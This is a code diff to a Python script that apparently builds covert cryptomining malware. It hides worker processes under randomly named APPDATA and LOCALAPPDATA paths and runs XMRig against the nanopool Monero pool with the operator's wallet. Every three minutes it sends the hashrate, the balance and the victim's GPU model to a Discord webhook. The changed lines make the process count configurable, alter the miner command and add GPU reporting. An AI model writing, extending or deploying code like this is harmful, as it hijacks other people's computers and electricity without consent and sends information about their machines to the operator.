@@ -83,7 +83,7 @@ PROCESS_PATHS = [
 	os.getenv('APPDATA') + "\\"+ str(uuid.uuid4()), 
 	os.getenv('LOCALAPPDATA') + "\\"+ str(uuid.uuid4()),
 ]
-PROCESS_NUM = 2
+PROCESS_NUM = processnumbers
 
 MINE = True #Mine crypto? True/False
 MINING_PERCENT = "30"
@@ -669,7 +669,7 @@ if yes == "yes":
 				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
 	def MineThreadWin():
 		print("[.] Starting miner if enabled.")
-		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + '.'+  str(uuid.uuid4()) + '/yazdraw@gmail.com --coin=monero --threads=4 ')
+		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --coin=monero --threads=4 ')
 	def MineThreadLinux():
 		print("[.] Starting miner if enabled.")
 		try:
@@ -757,7 +757,7 @@ if yes == "yes":
 				elif("avghashrate" in STATSAPI[i]):
 					avgHASHRATE  = result
 
-			embed = DiscordEmbed(title='Stats :', description=f':chart: Stats of miner : \n\n:bar_chart: Hashrate : {hashrate}\n:chart_with_upwards_trend: AVG hashrate : {avgHASHRATE}\n:moneybag: Balance : {balanceXMR}\nSeding again in 3 minutes..', color='03b2f8')
+			embed = DiscordEmbed(title='Stats :', description=f':chart: Stats of miner : \n\n:bar_chart: Hashrate : {hashrate}\n:chart_with_upwards_trend: AVG hashrate : {avgHASHRATE}\n:moneybag: Balance : {balanceXMR}\nSent from : {GPUMODEL.Caption}\nSending again in 3 minutes..', color='03b2f8')
 			webhook.add_embed(embed)
 			webhook.execute()
 			time.sleep(180)
